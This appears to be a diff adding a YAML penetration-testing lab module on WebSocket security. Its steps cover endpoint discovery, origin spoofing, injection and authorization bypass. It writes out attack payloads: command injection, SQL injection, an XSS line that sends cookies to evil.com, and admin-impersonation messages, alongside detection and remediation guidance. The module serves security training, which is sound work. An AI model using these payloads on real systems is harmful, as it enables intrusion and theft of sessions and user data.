@@ -1,0 +1,166 @@
+# Category: Web Application Security - Protocol Vulnerabilities
+name: "WebSocket Security Testing & Hijacking Assessment"
+id: "web-websocket-001"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "intermediate"
+estimated_time: "45 minutes"
+
+description: |
+  Assess WebSocket implementations for authentication bypass, message injection,
+  origin validation flaws, and data exfiltration risks. Validate secure framing,
+  TLS enforcement, and authorization at the message level.
+
+learning_objectives:
+  - Enumerate WebSocket endpoints and subprotocols
+  - Test for origin header validation and CORS misconfigurations
+  - Exploit message injection and command execution via WebSocket
+  - Map findings to OWASP API Security and SOC 2 monitoring controls
+
+tools:
+  - burp_suite_community
+  - wscat
+  - curl
+  - python_websockets
+  - mitmproxy
+  - postman
+
+prerequisites:
+  - Target application with WebSocket functionality (ws:// or wss://)
+  - Authorization for protocol-level security testing
+  - Understanding of WebSocket handshake and framing
+  - Valid authentication credentials if endpoint requires auth
+
+steps:
+  - id: step1
+    phase: "reconnaissance"
+    action: "Identify WebSocket endpoints and subprotocols"
+    commands:
+      - "# Scan for WebSocket endpoints in JavaScript"
+      - "curl -s https://[target_url] | grep -oE 'ws[s]?://[^\"'\\`\\s]+' | sort -u"
+      - "# Test WebSocket handshake with wscat"
+      - "wscat -c wss://[target_domain]/ws -x '{\"type\":\"handshake\"}'"
+      - "# Enumerate supported subprotocols"
+      - "curl -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: graphql-ws, mqtt, custom' https://[target_domain]/ws"
+      - "# Check for unauthenticated WebSocket access"
+      - "wscat -c wss://[target_domain]/ws --no-check -x '{\"query\":\"{__schema{types{name}}}\"}'"
+    expected_output: "List of WebSocket endpoints, supported subprotocols, and authentication requirements"
+    detection: "WAF logs showing WebSocket upgrade requests; unusual Sec-WebSocket-Protocol values"
+
+  - id: step2
+    phase: "enumeration"
+    action: "Test origin validation and CORS misconfigurations"
+    commands:
+      - "# Test with spoofed Origin header"
+      - "wscat -c wss://[target_domain]/ws -H 'Origin: https://evil.com' -x '{\"type\":\"test\"}'"
+      - "# Check if server validates Sec-WebSocket-Origin"
+      - "curl -i -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Origin: https://evil.com' https://[target_domain]/ws"
+      - "# Test cross-origin WebSocket connection from browser console"
+      - "# Open browser devtools and run: new WebSocket('wss://[target_domain]/ws')"
+      - "# Monitor network tab for connection success/failure"
+    expected_output: "Confirmation whether origin validation is enforced; potential for cross-origin attacks"
+    compliance_mapping: ["OWASP API Security Top 10 - API8:2023", "SOC 2 CC6.6"]
+
+  - id: step3
+    phase: "exploitation"
+    action: "Test message injection and command execution"
+    commands:
+      - "# Send malicious payload via WebSocket"
+      - "wscat -c wss://[target_domain]/ws -x '{\"action\":\"exec\",\"cmd\":\"id; whoami\"}'"
+      - "# Test SQL injection via WebSocket message"
+      - "wscat -c wss://[target_domain]/ws -x '{\"query\":\"SELECT * FROM users WHERE id=1 OR 1=1--\"}'"
+      - "# Test XSS payload injection (if messages rendered in DOM)"
+      - "wscat -c wss://[target_domain]/ws -x '{\"message\":\"<script>document.location='https://evil.com?c='+document.cookie</script>\"}'"
+      - "# Test for server-side template injection via WebSocket"
+      - "wscat -c wss://[target_domain]/ws -x '{\"template\":\"{{7*7}}\"}'"
+    expected_output: "Server response indicating command execution, data leakage, or injection success"
+    risk_level: "high"
+    detection: "Application logs showing unexpected message patterns; WAF alerts for injection signatures"
+
+  - id: step4
+    phase: "exploitation"
+    action: "Test authentication/authorization bypass via WebSocket"
+    commands:
+      - "# Attempt to connect without authentication token"
+      - "wscat -c wss://[target_domain]/ws -x '{\"type\":\"subscribe\",\"channel\":\"admin-updates\"}'"
+      - "# Test privilege escalation via channel subscription"
+      - "wscat -c wss://[target_domain]/ws -H 'Authorization: Bearer [user_token]' -x '{\"subscribe\":\"admin-channel\"}'"
+      - "# Test message replay with modified user context"
+      - "wscat -c wss://[target_domain]/ws -x '{\"userId\":\"[admin_id]\",\"action\":\"deleteUser\"}'"
+    expected_output: "Successful unauthorized subscription or privileged action execution"
+    compliance_mapping: ["OWASP API Security Top 10 - API2:2023", "PCI DSS v4.0-8.3.1"]
+
+  - id: step5
+    phase: "post_exploitation"
+    action: "Exfiltrate data via WebSocket channel"
+    commands:
+      - "# Subscribe to data channel and capture responses"
+      - "wscat -c wss://[target_domain]/ws -x '{\"subscribe\":\"user-data\"}' > /tmp/ws_dump.txt &"
+      - "# Monitor for sensitive data in real-time stream"
+      - "tail -f /tmp/ws_dump.txt | grep -i -E 'password|token|email|ssn|credit'"
+      - "# Test for data leakage via error messages"
+      - "wscat -c wss://[target_domain]/ws -x '{\"invalid\":\"payload\"}' 2>&1 | grep -i 'error\\|exception\\|stack'"
+    expected_output: "Captured sensitive data or error-based information disclosure"
+    compliance_mapping: ["SOC 2 CC7.1", "GDPR Article 32"]
+
+detection:
+  network_indicators:
+    - "WebSocket upgrade requests from unexpected origins or IPs"
+    - "High-frequency message patterns indicating automated testing or flooding"
+    - "Messages containing injection payloads (SQL, XSS, command execution)"
+  log_indicators:
+    - "Application logs: WebSocket connection accepted without valid auth token"
+    - "Message processing logs: Execution of unexpected commands or queries"
+    - "WAF logs: Blocked WebSocket messages matching injection rule IDs"
+  endpoint_indicators:
+    - "wscat, Burp WebSocket plugin, or custom WebSocket client execution"
+    - "Browser devtools showing manual WebSocket connection attempts"
+
+remediation:
+  immediate:
+    - "Enforce strict origin validation: reject connections from untrusted domains"
+    - "Implement message-level authentication and authorization checks"
+    - "Sanitize and validate all incoming WebSocket messages before processing"
+  long_term:
+    - "Deploy WebSocket-specific WAF rules for injection and flooding patterns"
+    - "Implement rate limiting per WebSocket connection and user context"
+    - "Log all WebSocket messages for audit and forensic analysis (SOC 2 CC7.2)"
+    - "Conduct periodic WebSocket security reviews as part of API security program"
+
+compliance_controls:
+  - standard: "OWASP API Security Top 10 2023"
+    control: "API8:2023-Security Misconfiguration"
+    description: "Missing or misconfigured security controls in API implementations"
+  - standard: "SOC 2 Type II"
+    control: "CC6.6"
+    description: "Logical access controls enforce network segmentation and protocol security"
+  - standard: "NIST 800-53 Rev. 5"
+    control: "SC-8"
+    description: "Transmission confidentiality and integrity for data in transit"
+  - standard: "PCI DSS v4.0"
+    control: "6.5.10"
+    description: "Broken authentication and session management vulnerabilities"
+
+variables:
+  target_domain: "api.example.com"
+  target_url: "https://[target_domain]"
+  ws_endpoint: "/ws"
+  user_token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+  admin_id: "usr_admin_001"
+
+assessment_questions:
+  - "Why is origin validation critical for WebSocket security?"
+  - "How does message-level authorization differ from connection-level auth in WebSockets?"
+  - "What WAF rules can detect WebSocket-based injection attacks?"
+  - "Which OWASP API Security category covers WebSocket origin validation flaws?"
+  - "How would you implement rate limiting for WebSocket connections?"
+
+references:
+  - url: "https://owasp.org/www-project-api-security/"
+    title: "OWASP API Security Top 10"
+  - url: "https://github.com/websockets/wscat"
+    title: "wscat - WebSocket Command-Line Client"
+  - url: "https://portswigger.net/burp/documentation/desktop/tools/websockets"
+    title: "Burp Suite WebSocket Testing Guide"
+  - url: "https://datatracker.ietf.org/doc/html/rfc6455"
+    title: "The WebSocket Protocol (RFC 6455)"
